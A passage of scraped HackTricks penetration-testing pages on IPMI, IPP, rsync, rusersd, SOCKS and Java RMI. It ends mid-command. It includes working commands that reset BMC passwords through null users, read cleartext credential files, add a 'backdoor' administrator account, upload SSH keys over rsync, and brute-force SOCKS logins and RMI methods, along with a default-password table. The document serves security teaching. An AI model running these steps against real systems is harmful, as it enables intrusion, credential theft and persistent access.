match. The\nipmi_dumphashes\nmodule will identify and dump the password hashes (including blank passwords) for null user accounts.\nThis account can be difficult to use on its own, but we can leverage\nipmitool\nto reset the password of a named user account\nand leverage that account for access to other services:\nipmitool\n-I\nlanplus\n-H\n10.0\n.0.97\n-U\n''\n-P\n''\nuser list\n‚Äã\nID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit\n1\nfalse\nfalse\ntrue\nADMINISTRATOR\n2\nroot\nfalse\nfalse\ntrue\nADMINISTRATOR\n3\nadmin\ntrue\ntrue\ntrue\nADMINISTRATOR\n‚Äã\nipmitool\n-I\nlanplus\n-H\n10.0\n.0.97\n-U\n''\n-P\n''\nuser\nset\npassword\n2\nnewpassword\n#Change the password of the user 2 (root) to \"newpassword\"\nVulnerability - Supermicro IPMI Clear-text Passwords\nThe IPMI 2.0 specification mandates that the BMC respond to HMAC-based authentication methods such as SHA1 and MD5. This authentication process has some serious weaknesses, as demonstrated in previous examples, but also\nrequires access to the clear-text password in order to calculate the authentication hash\n. This means that the BMC must store a\nclear-text version\nof all configured user passwords somewhere in\nnon-volatile storage\n. In the case of\nSupermicro\n, this location changes between firmware versions, but is either\n/nv/PSBlock\nor\n/nv/PSStore\n. The passwords are scattered between various binary blobs, but easy to pick out as they always follow the username. This is a serious issue for any organization that uses shared passwords between BMCs or even different types of devices.\ncat\n/nv/PSBlock\nadmin                      ADMINpassword^TT                    rootOtherPassword\n!\nVulnerability - Supermicro IPMI UPnP\nSupermicro includes a\nUPnP SSDP listener running on UDP port 1900\non the IPMI firmware of many of its recent motherboards. On versions prior to SMT_X9_218 this service was running the Intel SDK for UPnP Devices, version 1.3.1. This version is vulnerable to\nthe issues Rapid7 disclosed\nin February of 2013, and an exploit target for this platform is part of the Metasploit Framework. The interesting thing about this attack is that it\nyields complete root access to the BMC\n, something that is otherwise difficult to obtain. Keep in mind than an attacker with administrative access, either over the network or from a root shell on the host system, can downgrade the firmware of a Supermicro BMC to a vulnerable version and then exploit it. Once\nroot\naccess is\nobtained\n, it is possible to\nread cleartext credentials\nfrom the file system,\ninstall\nadditional\nsoftware\n, and integrate permanent\nbackdoors\ninto the BMC that would survive a full reinstall of the host's operating system.\nmsf\n>\nuse exploit/multi/upnp/libupnp_ssdp_overflow\nBrute Force\nNote that only HP randomizes the password during the manufacturing process.\nProduct Name\nDefault Username\nDefault Password\nHP Integrated Lights Out (iLO)\nAdministrator\n<factory randomized 8-character string>\nDell Remote Access Card (iDRAC, DRAC)\nroot\ncalvin\nIBM Integrated Management Module (IMM)\nUSERID\nPASSW0RD (with a zero)\nFujitsu Integrated Remote Management Controller\nadmin\nadmin\nSupermicro IPMI (2.0)\nADMIN\nADMIN\nOracle/Sun Integrated Lights Out Manager (ILOM)\nroot\nchangeme\nASUS iKVM BMC\nadmin\nadmin\nExploiting the Host from the BMC\nOnce administrative access to the BMC is obtained, there are a number of methods available that can be used to gain access to the host operating system. The most direct path is to abuse the BMCs KVM functionality and reboot the host to a root shell (init=/bin/sh in GRUB) or specify a rescue disk as a virtual CD-ROM and boot to that. Once raw access to the host's disk is obtained, it is trivial to introduce a backdoor, copy data from the hard drive, or generally do anything needing doing as part of the security assessment. The big downside, of course, is that the host has to be rebooted to use this method. Gaining access to the host running is much trickier and depends on what the host is running. If the physical console of the host is left logged in, it becomes trivial to hijack this using the built-in KVM functionality. The same applies to serial consoles - if the serial port is connected to an authenticated session, the BMC may allow this port to be hijacked using the ipmitool interface for serial-over-LAN (sol). One path that still needs more research is abusing access to shared hardware, such as the i2c bus and the Super I/O chip.\nExploiting the BMC from the Host\nIn situations where a host with a BMC has been compromised, the\nlocal interface to the BMC can be used to introduce a backdoor user account\n, and from there establish a permanent foothold on the server. This attack requires the\nipmitool\nto be installed on the host and driver support to be enabled for the BMC. The example below demonstrates how the local interface on the host, which does not require authentication, can be used to inject a new user account into the BMC. This method is universal across Linux, Windows, BSD, and even DOS targets.\nipmitool user list\nID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit\n2\nADMIN\ntrue\nfalse\nfalse\nUnknown\n(\n0x00\n)\n3\nroot\ntrue\nfalse\nfalse\nUnknown\n(\n0x00\n)\n‚Äã\nipmitool user\nset\nname\n4\nbackdoor\nipmitool user\nset\npassword\n4\nbackdoor\nipmitool user priv\n4\n4\nipmitool user list\nID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit\n2\nADMIN\ntrue\nfalse\nfalse\nUnknown\n(\n0x00\n)\n3\nroot\ntrue\nfalse\nfalse\nUnknown\n(\n0x00\n)\n4\nbackdoor\ntrue\nfalse\ntrue\nADMINISTRATOR\nShodan\nport:623\nReferences\n‚Äã\nhttps://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/\n‚Äã\n‚Äã\nhttps://academy.hackthebox.com/module/112/section/1245\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n554,8554 - Pentesting RTSP\nNext\n- Network Services Pentesting\n631 - Internet Printing Protocol(IPP)\nLast modified\n6mo ago"
    },
    {
        "title": "631 - Internet Printing Protocol(IPP)",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-631-internet-printing-protocol-ipp",
        "text": "631 - Internet Printing Protocol(IPP)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nInternet Printing Protocol (IPP)\nThe Internet Printing Protocol (IPP) is defined in RFC2910 and RFC2911. It's an extendable protocol, for example ‚ÄòIPP Everywhere‚Äô is a candidate for a standard in mobile and cloud printing and IPP extensions for 3D printing have been released.\nBecause IPP is based on\nHTTP\n, it inherits all existing security features like basic/digest authentication and\nSSL/TLS\nencryption. To submit a print job or to retrieve status information from the printer, an HTTP POST request is sent to the IPP server listening on\nport 631/tcp\n. A famous open-source IPP implementation is CUPS, which is the default printing system in many Linux distributions and OS X. Similar to LPD, IPP is a\nchannel\nto deploy the actual data to be printed and can be abused as a carrier for malicious PostScript or PJL files.\nIf you want to learn more about\nhacking printers read this page\n.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n623/UDP/TCP - IPMI\nNext\n- Network Services Pentesting\n873 - Pentesting Rsync\nLast modified\n6mo ago"
    },
    {
        "title": "873 - Pentesting Rsync",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync",
        "text": "873 - Pentesting Rsync\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nrsync\nis a utility for efficiently\ntransferring\nand\nsynchronizing\nfiles\nbetween a computer and an external hard drive and across\nnetworked\ncomputers\nby comparing the\nmodification times\nand sizes of files.\n[3]\nIt is commonly found on\nUnix-like\noperating systems\n. The rsync algorithm is a type of\ndelta encoding\n, and is used for minimizing network usage.\nZlib\nmay be used for additional\ndata compression\n,\n[3]\nand\nSSH\nor\nstunnel\ncan be used for security.\nFrom\nwikipedia\n.\nDefault port:\n873\nPORT    STATE SERVICE REASON\n873/tcp open  rsync   syn-ack\nEnumeration\nBanner & Manual communication\nnc -vn 127.0.0.1 873\n(UNKNOWN) [127.0.0.1] 873 (rsync) open\n@RSYNCD: 31.0        <--- You receive this banner with the version from the server\n@RSYNCD: 31.0        <--- Then you send the same info\n#list                <--- Then you ask the sever to list\nraidroot             <--- The server starts enumerating\nUSBCopy\nNAS_Public\n_NAS_Recycle_TOSRAID\t<--- Enumeration finished\n@RSYNCD: EXIT         <--- Sever closes the connection\n‚Äã\n‚Äã\n#Now lets try to enumerate \"raidroot\"\nnc -vn 127.0.0.1 873\n(UNKNOWN) [127.0.0.1] 873 (rsync) open\n@RSYNCD: 31.0\n@RSYNCD: 31.0\nraidroot\n@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password\nEnumerate shared folders\nAn rsync module is essentially a directory share\n. These modules\ncan optionally be protected by a password\n. This options lists the available modules and, optionally, determines if the module requires a password to access**:**\nnmap\n-sV\n--script\n\"rsync-list-modules\"\n-p\n<\nPORT\n>\n<\nIP\n>\nmsf\n>\nuse auxiliary/scanner/rsync/modules_list\n‚Äã\n#Example using IPv6 and a different port\nrsync\n-av\n--list-only rsync://\n[\ndead:beef::250:56ff:feb9:e90a\n]\n:8730\nNotice that it could be configured a shared name to not be listed. So there could be something\nhidden\n.\nNotice that it may be some\nshared names\nbeing listed where you need some (different)\ncredentials\nto access. So, not always all the listed names are going to be accessible and you will notice it if you receive an\n\"Access Denied\"\nmessage when trying to access some of those.\n‚Äã\nBrute force\n‚Äã\nManual Rsync\nOnce you have the\nlist of modules\nyou have a few different options depending on the actions you want to take and whether or not authentication is required.\nIf authentication is not required\nyou can\nlist\na shared folder:\nrsync\n-av\n--list-only rsync://192.168.0.123/shared_name\nAnd\ncopy\nall\nfiles\nto your local machine via the following command:\nrsync\n-av\nrsync://192.168.0.123:8730/shared_name ./rsyn_shared\nThis\nrecursively transfers all files from the directory\n<shared_name>\non the machine\n<IP>\ninto the\n./rsync_shared\ndirectory on the local machine. The files are transferred in \"archive\" mode, which ensures that symbolic links, devices, attributes, permissions, ownerships, etc. are preserved in the transfer.\nIf you\nhave credentials\nyou can\nlist/download\na\nshared name\nusing (the password will be prompted):\nrsync\n-av\n--list-only rsync://\n[email¬†protected]\n/shared_name\nrsync\n-av\nrsync://\n[email¬†protected]\n:8730/shared_name ./rsyn_shared\nYou could also\nupload\nsome\ncontent\nusing rsync (for example, in this case we can upload an\nauthorized_keys\nfile to obtain access to the box):\nrsync\n-av\nhome_user/.ssh/ rsync://\n[email¬†protected]\n/home_user/.ssh\nPOST\nFind the rsyncd configuration file:\nfind\n/etc\n\\(\n-name\nrsyncd.conf\n-o\n-name\nrsyncd.secrets\n\\)\nInside the config file sometimes you could find the parameter\nsecrets file = /path/to/file\nand this file could contains usernames and passwords allowed to authenticate to rsyncd.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n631 - Internet Printing Protocol(IPP)\nNext\n- Network Services Pentesting\n1026 - Pentesting Rusersd\nLast modified\n6mo ago"
    },
    {
        "title": "1026 - Pentesting Rusersd",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/1026-pentesting-rusersd",
        "text": "1026 - Pentesting Rusersd\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nThis protocol will provide you the usernames of the host. You may be able to find this services listed by the port-mapper service like this:\nEnumeration\nroot@kali:~# apt-get install rusers\nroot@kali:~# rusers -l 192.168.10.1\nSending broadcast for rusersd protocol version 3...\nSending broadcast for rusersd protocol version 2...\ntiff       potatohead:console         Sep  2 13:03   22:03\nkatykat    potatohead:ttyp5           Sep  1 09:35      14\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n873 - Pentesting Rsync\nNext\n- Network Services Pentesting\n1080 - Pentesting Socks\nLast modified\n6mo ago"
    },
    {
        "title": "1080 - Pentesting Socks",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/1080-pentesting-socks",
        "text": "1080 - Pentesting Socks\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nSOCKS is an Internet protocol that exchanges network packets between a client and server through a proxy server. SOCKS5 optionally provides authentication,\nso only authorized users may access a server.\nPractically, a SOCKS server proxies TCP connections to an arbitrary IP address, and provides a means for UDP packets to be forwarded.\nSOCKS performs at Layer 5 of the OSI model\nDefault Port:\n1080\nEnumeration\nAuthentication Check\nnmap\n-p\n1080\n<\nip\n>\n--script\nsocks-auth-info\nBrute Force\nBasic usage\nnmap\n--script\nsocks-brute\n-p\n1080\n<\nip\n>\nAdvanced usage\nnmap\n--script\nsocks-brute --script-args\nuserdb\n=\nusers.txt,passdb\n=\nrockyou.txt,unpwdb.timelimit\n=\n30m\n-p\n1080\n<\nip\n>\nOutput\nPORT     STATE SERVICE\n1080/tcp open  socks\n| socks-brute:\n|   Accounts\n|     patrik:12345 - Valid credentials\n|   Statistics\n|_    Performed 1921 guesses in 6 seconds, average tps: 320\nTunneling and Port Forwarding\nBasic proxychains usage\nSetup proxy chains to use socks proxy\nnano /etc/proxychains4.conf\nEdit the bottom and add your proxy\nsocks5 10.10.10.10 1080\nWith auth\nsocks5 10.10.10.10 1080 username password\nMore info:\nTunneling and Port Forwarding\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n1026 - Pentesting Rusersd\nNext\n- Network Services Pentesting\n1098/1099/1050 - Pentesting Java RMI - RMI-IIOP\nLast modified\n6mo ago"
    },
    {
        "title": "1098/1099/1050 - Pentesting Java RMI - RMI-IIOP",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/1099-pentesting-java-rmi",
        "text": "1098/1099/1050 - Pentesting Java RMI - RMI-IIOP\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nBasic Information\nJava Remote Method Invocation\n, or\nJava RMI\n, is an object oriented\nRPC\nmechanism that allows an object located in one\nJava virtual machine\nto call methods on an object located in another\nJava virtual machine\n. This enables developers to write distributed applications using an object-oriented paradigm. A short introduction to\nJava RMI\nfrom an offensive perspective can be found in\nthis blackhat talk\n.\nDefault port:\n1090,1098,1099,1199,4443-4446,8999-9010,9999\nPORT      STATE SERVICE      VERSION\n1090/tcp  open  ssl/java-rmi Java RMI\n9010/tcp  open  java-rmi     Java RMI\n37471/tcp open  java-rmi     Java RMI\n40259/tcp open  ssl/java-rmi Java RMI\nUsually, only the default\nJava RMI\ncomponents (the\nRMI Registry\nand the\nActivation System\n) are bound to common ports. The\nremote objects\nthat implement the actual\nRMI\napplication are usually bound to random ports as shown in the output above.\nnmap\nhas sometimes troubles identifying\nSSL\nprotected\nRMI\nservices. If you encounter an unknown ssl service on a common\nRMI\nport, you should further investigate.\nRMI Components\nTo put it in simple terms,\nJava RMI\nallows a developer to make a\nJava object\navailable on the network. This opens up a\nTCP\nport where clients can connect and call methods on the corresponding object. Despite this sounds simple, there are several challenges that\nJava RMI\nneeds to solve:\n1.\nTo dispatch a method call via\nJava RMI\n, clients need to know the IP address, the listening port, the implemented class or interface and the\nObjID\nof the targeted object (the\nObjID\nis a unique and random identifier that is created when the object is made available on the network. It is required because\nJava RMI\nallows multiple objects to listen on the same\nTCP\nport).\n2.\nRemote clients may allocate resources on the server by invoking methods on the exposed object. The\nJava virtual machine\nneeds to track which of these resources are still in use and which of them can be garbage collected.\nThe first challenge is solved by the\nRMI registry\n, which is basically a naming service for\nJava RMI\n. The\nRMI registry\nitself is also an\nRMI service\n, but the implemented interface and the\nObjID\nare fixed and known by all\nRMI\nclients. This allows\nRMI\nclients to consume the\nRMI\nregistry just by knowing the corresponding\nTCP\nport.\nWhen developers want to make their\nJava objects\navailable within the network, they usually bind them to an\nRMI registry\n. The\nregistry\nstores all information required to connect to the object (IP address, listening port, implemented class or interface and the\nObjID\nvalue) and makes it available under a human readable name (the\nbound name\n). Clients that want to consume the\nRMI service\nask the\nRMI registry\nfor the corresponding\nbound name\nand the registry returns all required information to connect. Thus, the situation is basically the same as with an ordinary\nDNS\nservice. The following listing shows a small example:\nimport\njava\n.\nrmi\n.\nregistry\n.\nRegistry\n;\nimport\njava\n.\nrmi\n.\nregistry\n.\nLocateRegistry\n;\nimport\nlab\n.\nexample\n.\nrmi\n.\ninterfaces\n.\nRemoteService\n;\n‚Äã\npublic\nclass\nExampleClient\n{\n‚Äã\nprivate\nstatic\nfinal\nString\nremoteHost\n=\n\"172.17.0.2\"\n;\nprivate\nstatic\nfinal\nString\nboundName\n=\n\"remote-service\"\n;\n‚Äã\npublic\nstatic\nvoid\nmain\n(\nString\n[]\nargs\n)\n{\ntry\n{\nRegistry\nregistry\n=\nLocateRegistry\n.\ngetRegistry\n(\nremoteHost\n);\n// Connect to the RMI registry\nRemoteService\nref\n=\n(\nRemoteService\n)\nregistry\n.\nlookup\n(\nboundName\n);\n// Lookup the desired bound name\nString\nresponse\n=\nref\n.\nremoteMethod\n();\n// Call a remote method\n}\ncatch\n(\nException\ne\n)\n{\ne\n.\nprintStackTrace\n();\n}\n}\n}\nThe second of the above mentioned challenges is solved by the\nDistributed Garbage Collector\n(\nDGC\n). This is another\nRMI service\nwith a well known\nObjID\nvalue and it is available on basically each\nRMI endpoint\n. When an\nRMI client\nstarts to use an\nRMI service\n, it sends an information to the\nDGC\nthat the corresponding\nremote object\nis in use. The\nDGC\ncan then track the reference count and is able to cleanup unused objects.\nTogether with the deprecated\nActivation System\n, these are the three default components of\nJava RMI\n:\n1.\nThe\nRMI Registry\n(\nObjID = 0\n)\n2.\nThe\nActivation System\n(\nObjID = 1\n)\n3.\nThe\nDistributed Garbage Collector\n(\nObjID = 2\n)\nThe default components of\nJava RMI\nhave been known attack vectors for quite some time and multiple vulnerabilities exist in outdated\nJava\nversions. From an attacker perspective, these default components are interisting, because they implemented known classes / interfaces and it is easily possible to interact with them. This situation is different for custom\nRMI services\n. To call a method on a\nremote object\n, you need to know the corresponding method signature in advance. Without knowing an existing method signature, there is no way to communicate to a\nRMI service\n.\nRMI Enumeration\n‚Äã\nremote-method-guesser\nis a\nJava RMI\nvulnerability scanner that is capable of identifying common\nRMI vulnerabilities\nautomatically. Whenever you identify an\nRMI\nendpoint, you should give it a try:\n$ rmg enum 172.17.0.2 9010\n[+] RMI registry bound names:\n[+]\n[+] \t- plain-server2\n[+] \t\t--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)\n[+] \t\t    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ff7, 3638117546492248534]\n[+] \t- legacy-service\n[+] \t\t--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)\n[+] \t\t    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ffc, 708796783031663206]\n[+] \t- plain-server\n[+] \t\t--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)\n[+] \t\t    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]\n[+]\n[+] RMI server codebase enumeration:\n[+]\n[+] \t- http://iinsecure.dev/well-hidden-development-folder/\n[+] \t\t--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub\n[+] \t\t--> de.qtc.rmg.server.interfaces.IPlainServer\n[+]\n[+] RMI server String unmarshalling enumeration:\n[+]\n[+] \t- Caught ClassNotFoundException during lookup call.\n[+] \t  --> The type java.lang.String is unmarshalled via readObject().\n[+] \t  Configuration Status: Outdated\n[+]\n[+] RMI server useCodebaseOnly enumeration:\n[+]\n[+] \t- Caught MalformedURLException during lookup call.\n[+] \t  --> The server attempted to parse the provided codebase (useCodebaseOnly=false).\n[+] \t  Configuration Status: Non Default\n[+]\n[+] RMI registry localhost bypass enumeration (CVE-2019-2684):\n[+]\n[+] \t- Caught NotBoundException during unbind call (unbind was accepeted).\n[+] \t  Vulnerability Status: Vulnerable\n[+]\n[+] RMI Security Manager enumeration:\n[+]\n[+] \t- Security Manager rejected access to the class loader.\n[+] \t  --> The server does use a Security Manager.\n[+] \t  Configuration Status: Current Default\n[+]\n[+] RMI server JEP290 enumeration:\n[+]\n[+] \t- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).\n[+] \t  Vulnerability Status: Non Vulnerable\n[+]\n[+] RMI registry JEP290 bypass enmeration:\n[+]\n[+] \t- Caught IllegalArgumentException after sending An Trinh gadget.\n[+] \t  Vulnerability Status: Vulnerable\n[+]\n[+] RMI ActivationSystem enumeration:\n[+]\n[+] \t- Caught IllegalArgumentException during activate call (activator is present).\n[+] \t  --> Deserialization allowed\t - Vulnerability Status: Vulnerable\n[+] \t  --> Client codebase enabled\t - Configuration Status: Non Default\nThe output of the enumeration action is explained in more detail in the\ndocumentation pages\nof the project. Depending on the outcome, you should try to verify identified vulnerabilities.\nThe\nObjID\nvalues displayed by\nremote-method-guesser\ncan be used to determine the uptime of the service. This may allows to identify other vulnerabilities:\n$ rmg objid '[55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]'\n[+] Details for ObjID [55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]\n[+]\n[+] ObjNum: \t\t-4004948013687638236\n[+] UID:\n[+] \tUnique: \t1442798173\n[+] \tTime: \t\t1640761503828 (Dec 29,2021 08:05)\n[+] \tCount: \t\t-32760\nBruteforcing Remote Methods\nEven when no vulnerabilities have been identified during enumeration, the available\nRMI\nservices could still expose dangerous functions. Furthermore, despite\nRMI\ncommunication to\nRMI\ndefault components is protected by deserialization filters, when talking to custom\nRMI\nservices, such filters are usually not in place. Knowing valid method signatures on\nRMI\nservices is therefore valuable.\nUnfortunately,\nJava RMI\ndoes not support enumerating methods on\nremote objects\n. That being said, it is possible to bruteforce method signatures with tools like\nremote-method-guesser\nor\nrmiscout\n:\n$ rmg guess 172.17.0.2 9010\n[+] Reading method candidates from internal wordlist rmg.txt\n[+] \t752 methods were successfully parsed.\n[+] Reading method candidates from internal wordlist rmiscout.txt\n[+] \t2550 methods were successfully parsed.\n[+]\n[+] Starting Method Guessing on 3281 method signature(s).\n[+]\n[+] \tMethodGuesser is running:\n[+] \t\t--------------------------------\n[+] \t\t[ plain-server2  ] HIT! Method with signature String execute(String dummy) exists!\n[+] \t\t[ plain-server2  ] HIT! Method with signature String system(String dummy, String[] dummy2) exists!\n[+] \t\t[ legacy-service ] HIT! Method with signature void logMessage(int dummy1, String dummy2) exists!\n[+] \t\t[ legacy-service ] HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!\n[+] \t\t[ legacy-service ] HIT! Method with signature String login(java.util.HashMap dummy1) exists!\n[+] \t\t[6562 / 6562] [#####################################] 100%\n[+] \tdone.\n[+]\n[+] Listing successfully guessed methods:\n[+]\n[+] \t- plain-server2 == plain-server\n[+] \t\t--> String execute(String dummy)\n[+] \t\t--> String system(String dummy, String[] dummy2)\n[+] \t- legacy-service\n[+] \t\t--> void logMessage(int dummy1, String dummy2)\n[+] \t\t--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)\n[+] \t\t--> String login(java.util.HashMap dummy1)\nIdentified methods can be called like this:\n$ rmg call 172.17.0.2 9010 